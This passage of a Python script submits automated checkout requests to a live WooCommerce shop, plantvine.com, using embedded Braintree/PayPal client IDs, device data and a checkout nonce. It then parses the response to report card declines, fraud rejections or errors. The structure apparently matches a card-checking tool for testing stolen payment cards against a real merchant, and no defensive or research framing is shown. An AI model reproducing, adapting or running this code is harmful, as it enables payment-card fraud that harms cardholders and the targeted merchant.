2%3A%22PlantVine%22%2C%22clientId%22%3A%22AXyO7aGJ8e89YcywvfXnXa1cx-VtyyRlUSysaXblKYrrlDp6Na61V4EoQPcibGtRBCCbE7bd0WMrA9zk%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fcheckout.paypal.com%22%2C%22environment%22%3A%22live%22%2C%22environmentNoNetwork%22%3Afalse%2C%22unvettedMerchant%22%3Afalse%2C%22braintreeClientId%22%3A%22ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW%22%2C%22billingAgreementsEnabled%22%3Atrue%2C%22merchantAccountId%22%3A%22plantvine_instant%22%2C%22payeeEmail%22%3Anull%2C%22currencyIsoCode%22%3A%22USD%22%7D%7D&braintree_paypal_nonce_key=&braintree_paypal_device_data=%7B%22device_session_id%22%3A%22168387d563becc11080bb4943aff34c5%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%22c7cf845f2aa91a87539423392ae5e06b%22%7D&braintree_googlepay_nonce_key=&braintree_googlepay_device_data=%7B%22device_session_id%22%3A%22168387d563becc11080bb4943aff34c5%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%22c7cf845f2aa91a87539423392ae5e06b%22%7D&braintree_applepay_nonce_key=&braintree_applepay_device_data=%7B%22device_session_id%22%3A%22168387d563becc11080bb4943aff34c5%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%22c7cf845f2aa91a87539423392ae5e06b%22%7D&woocommerce-process-checkout-nonce={check}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review'

        r_final = session.post('https://www.plantvine.com/', params=params_final, headers=headers_final, data=data_final)
        text = r_final.text

        if "Reason:" in text:
            match = re.search(r'Reason:\s(.*?)(?:\\t|<)', text)
            if match:
                return match.group(1).strip(), "DECLINED"
            else:
                return "Unknown reason", "DECLINED"
        else:
            return "Fraud Rejection", "DECLINED"
    except Exception as e:
        return f"Process Error: {str(e)}", "ERROR"
